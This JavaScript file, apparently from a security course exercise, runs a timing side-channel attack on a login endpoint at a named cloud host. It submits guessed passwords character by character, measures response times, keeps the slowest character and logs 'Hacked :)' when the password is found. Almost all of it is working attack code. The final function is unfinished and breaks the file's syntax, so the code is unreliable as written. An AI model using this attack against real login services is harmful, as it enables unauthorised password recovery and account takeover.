var url = 'https://ec2-54-188-28-123.us-west-2.compute.amazonaws.com:8080/';
var uname = "au597939";

let startPass = "iiiiiiii";

var tryPromises = [];
var tryTiming = [];

function tryPass(startIndex, maxInd, replInd, replMax, passSoFar, maxPassLength) {
  if (passSoFar.length + 1 > maxPassLength) {
    return Promise.resolve(passSoFar);
  }
  if (startIndex === 0 && replInd === 0) {
    tryTiming = [];
  }
  if (replInd === 0) {
    tryTiming.push([String.fromCodePoint(startIndex), []]);
  }
  let k = passSoFar.length;
  let fuzzyPass = passSoFar + String.fromCodePoint(startIndex) + startPass.slice(k + 1);
  let formData = new FormData();
  formData.append('username', uname);
  formData.append('password', fuzzyPass);
  let startTime = new Date().getTime();
  return fetch(url, {
    method: 'POST',
    body: formData
  }).then(res => {
    if (res.ok) {
      console.log("Hacked :), password is: ", passSoFar);
    }
    tryTiming[startIndex][1].push(new Date().getTime() - startTime);
    if (replInd + 1 < replMax) {
      return tryPass(startIndex, maxInd, replInd + 1, replMax, passSoFar, maxPassLength);
    }

    if (startIndex + 1 < maxInd) {
      return tryPass(startIndex + 1, maxInd, 0, replMax, passSoFar, maxPassLength);
    } else {
      // We have timing for all replications - calculate averages
      let averages = tryTiming.map(arr => [arr[0], arr[1].reduce((prev, curr) => prev + curr) / arr[1].length]);

      // Retrieve top 10 to see if we are close to guessing the right password
      // let topNumber = 10;
      // let topTen = averages.reduce((prev, curr) => {
      //   if (prev.length < topNumber) {
      //     return [...prev, curr];
      //   } else {
      //     let smallestInd = prev.map(p => p[1]).indexOf(Math.min(...prev.map(p => p[1])));
      //     let replaceMent = prev[smallestInd][1] > curr[1] ? prev[smallestInd] : curr;
      //     return [...prev.slice(0, smallestInd), replaceMent, ...prev.slice(smallestInd + 1)];
      //   }
      // }, []);

      // console.log("Top10: ", topTen);
      // Retrieve char with most delay
      let topChar = averages.reduce((prev, curr) => prev[1] > curr[1] ? prev : curr);
      // Concat to password so far
      console.log("TopChar: ", topChar);
      console.log("Pass so far: ", passSoFar + topChar[0]);
      return tryPass(0x0000, maxInd, 0, replMax, passSoFar + topChar[0], maxPassLength);
    }
  });
}

tryPass(0x0000, 0x00ff, 0, 1, "", 8).then(pass => {
  console.log(pass);
});

function filterSignal(signal, repl) {
  signal.reduce((prev, curr) => )
}